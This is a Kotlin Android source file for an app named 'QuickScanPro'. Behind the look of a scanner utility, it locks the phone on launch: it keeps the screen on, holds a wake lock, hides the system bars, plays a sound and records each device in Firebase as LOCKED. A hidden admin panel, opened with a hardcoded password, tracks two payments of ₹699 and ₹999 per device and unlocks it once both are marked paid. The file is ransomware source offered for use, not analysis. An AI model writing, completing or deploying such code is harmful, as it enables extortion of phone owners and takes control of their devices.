package com.quickscanpro

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.FirebaseApp
import com.google.firebase.database.*
import kotlinx.coroutines.*

class MainActivity : AppCompatActivity() {

    private lateinit var database: DatabaseReference
    private var deviceId: String = ""
    private var isPaid = false
    private var adminModeActive = false
    private val scope = CoroutineScope(Dispatchers.Main)

    // Admin Credentials
    private val ADMIN_USERNAME = "admin"
    private val ADMIN_PASSWORD = "atomic2024"

    // Payment Steps
    private val PAYMENT_STEP_1 = 699
    private val PAYMENT_STEP_2 = 999

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize Firebase
        FirebaseApp.initializeApp(this)
        database = FirebaseDatabase.getInstance().reference

        // Get Unique Device ID
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"

        // 1. Register device in Firebase
        registerDevice()

        // 2. Listen for status changes
        listenForStatus()

        // 3. Start Foreground Service
        startLockService()

        // 4. Apply immediate lockdown
        applyImmediateLockdown()

        // 5. Setup admin gesture
        setupAdminGesture()
    }

    private fun registerDevice() {
        val deviceRef = database.child("devices").child(deviceId)
        deviceRef.child("status").get().addOnCompleteListener { task ->
            if (task.isSuccessful && task.result.value == null) {
                deviceRef.child("status").setValue("LOCKED")
                deviceRef.child("lastSeen").setValue(System.currentTimeMillis())
                deviceRef.child("model").setValue(Build.MODEL)
                deviceRef.child("androidVersion").setValue(Build.VERSION.RELEASE)
                deviceRef.child("paymentStep").setValue(0)
                deviceRef.child("totalPaid").setValue(0)
            }
        }
    }

    private fun listenForStatus() {
        database.child("devices").child(deviceId).child("status")
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val status = snapshot.value as? String
                    isPaid = (status == "UNLOCKED")
                    updateLockState()
                }
                override fun onCancelled(error: DatabaseError) {}
            })
    }

    private fun updateLockState() {
        if (isPaid) {
            sendServiceCommand("UNLOCK")
            runOnUiThread {
                findViewById<View>(R.id.lockScreen).visibility = View.GONE
                findViewById<View>(R.id.paidScreen).visibility = View.VISIBLE
            }
        } else {
            sendServiceCommand("PLAY_SOUND")
            runOnUiThread {
                findViewById<View>(R.id.lockScreen).visibility = View.VISIBLE
                findViewById<View>(R.id.paidScreen).visibility = View.GONE
            }
        }
    }

    private fun sendServiceCommand(action: String) {
        val intent = Intent(this, QuickScanService::class.java)
        intent.action = action
        startService(intent)
    }

    private fun startLockService() {
        val intent = Intent(this, QuickScanService::class.java)
        startForegroundService(intent)
    }

    // ============ IMMEDIATE LOCKDOWN ============

    private fun applyImmediateLockdown() {
        // 1. Screen Hamesha On
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        // 2. WakeLock (Power Off Block)
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(
            PowerManager.FULL_WAKE_LOCK or 
            PowerManager.ACQUIRE_CAUSES_WAKEUP or 
            PowerManager.ON_AFTER_RELEASE
        )
        wakeLock.acquire()

        // 3. Immersive Mode (Status Bar Hide)
        window.decorSystemUiVisibility = (
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
            View.SYSTEM_UI_FLAG_FULLSCREEN
        )
    }

    // ============ ADMIN GESTURE ============

    private fun setupAdminGesture() {
        val scannerIcon = findViewById<View>(R.id.scannerIcon)
        
        // 5 second long press to open admin login
        scannerIcon.setOnLongClickListener {
            showAdminLogin()
            true
        }
    }

    private fun showAdminLogin() {
        val dialog = android.app.AlertDialog.Builder(this)
        
        val inputLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(30, 30, 30, 30)
        }

        val usernameInput = EditText(this).apply {
            hint = "Username"
            inputType = android.text.InputType.TYPE_CLASS_TEXT
        }

        val passwordInput = EditText(this).apply {
            hint = "Password"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or 
                       android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        }

        inputLayout.addView(usernameInput)
        inputLayout.addView(passwordInput)

        dialog.setView(inputLayout)
        dialog.setTitle("🔐 ADMIN LOGIN")
        dialog.setPositiveButton("LOGIN") { _, _ ->
            val username = usernameInput.text.toString()
            val password = passwordInput.text.toString()
            
            if (username == ADMIN_USERNAME && password == ADMIN_PASSWORD) {
                openAdminMode()
            } else {
                android.widget.Toast.makeText(
                    this, 
                    "Access Denied! Galat Username/Password.", 
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
        }
        dialog.setNegativeButton("Cancel") { _, _ -> }
        dialog.show()
    }

    private fun openAdminMode() {
        adminModeActive = true
        sendServiceCommand("MUTE_TEMP")

        findViewById<View>(R.id.adminPanel).visibility = View.VISIBLE
        findViewById<View>(R.id.lockScreen).visibility = View.GONE

        loadDevicesInAdmin()
    }

    private fun closeAdminMode() {
        adminModeActive = false
        sendServiceCommand("PLAY_SOUND")

        findViewById<View>(R.id.adminPanel).visibility = View.GONE
        findViewById<View>(R.id.lockScreen).visibility = View.VISIBLE
    }

    private fun loadDevicesInAdmin() {
        val deviceList = findViewById<LinearLayout>(R.id.deviceList)
        deviceList.removeAllViews()

        database.child("devices").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                deviceList.removeAllViews()
                if (!snapshot.exists()) {
                    addDeviceRow(deviceList, "No devices found", "LOCKED", 0, 0, deviceId)
                    return
                }

                for (child in snapshot.children) {
                    val id = child.key ?: continue
                    val model = child.child("model").value as? String ?: "Unknown"
                    val status = child.child("status").value as? String ?: "LOCKED"
                    val paymentStep = (child.child("paymentStep").value as? Number)?.toInt() ?: 0
                    val totalPaid = (child.child("totalPaid").value as? Number)?.toInt() ?: 0

                    addDeviceRow(deviceList, model, status, paymentStep, totalPaid, id)
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun addDeviceRow(parent: LinearLayout, name: String, status: String, paymentStep: Int, totalPaid: Int, deviceId: String) {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(10, 10, 10, 10)
        }

        val topRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = android.view.Gravity.CENTER_VERTICAL
        }

        val nameText = TextView(this).apply {
            text = "$name (ID: ${deviceId.take(8)}...)"
            textColor = android.graphics.Color.WHITE
            textSize = 12f
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val statusText = TextView(this).apply {
            text = if (status == "UNLOCKED") "✅ UNLOCKED" else if (paymentStep == 1) "⏳ PARTIAL" else "🔒 LOCKED"
            textColor = if (status == "UNLOCKED") 
                android.graphics.Color.parseColor("#22c55e") 
            else if (paymentStep == 1)
                android.graphics.Color.parseColor("#f59e0b")
            else 
                android.graphics.Color.parseColor("#ef4444")
            textSize = 12f
        }

        val paidText = TextView(this).apply {
            text = "Paid: ₹$totalPaid"
            textColor = android.graphics.Color.parseColor("#a78bfa")
            textSize = 11f
        }

        topRow.addView(nameText)
        topRow.addView(statusText)
        row.addView(topRow)
        row.addView(paidText)

        // Action Buttons
        val buttonRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(0, 5, 0, 0)
        }

        if (paymentStep == 0) {
            val advanceBtn = Button(this).apply {
                text = "+₹699"
                setTextColor(android.graphics.Color.WHITE)
                setBackgroundColor(android.graphics.Color.parseColor("#f59e0b"))
                setOnClickListener {
                    database.child("devices").child(deviceId).update(mapOf(
                        "paymentStep" to 1,
                        "totalPaid" to 699,
                        "status" to "PARTIAL"
                    ))
                }
            }
            buttonRow.addView(advanceBtn)
        } else if (paymentStep == 1) {
            val completeBtn = Button(this).apply {
                text = "+₹999"
                setTextColor(android.graphics.Color.WHITE)
                setBackgroundColor(android.graphics.Color.parseColor("#22c55e"))
                setOnClickListener {
                    database.child("devices").child(deviceId).update(mapOf(
                        "paymentStep" to 2,
                        "totalPaid" to 1698,
                        "status" to "UNLOCKED"
                    ))
                }
            }
            buttonRow.addView(completeBtn)
        }

        val resetBtn = Button(this).apply {
            text = "Reset"
            setTextColor(android.graphics.Color.WHITE)
            setBackgroundColor(android.graphics.Color.parseColor("#ef4444"))
            setOnClickListener {
                database.child("devices").child(deviceId).update(mapOf(
                    "paymentStep" to 0,
                    "totalPaid" to 0,
                    "status" to "LOCKED"
                ))
            }
        }
        buttonRow.addView(resetBtn)
        row.addView(buttonRow)

        parent.addView(row)
    }
}
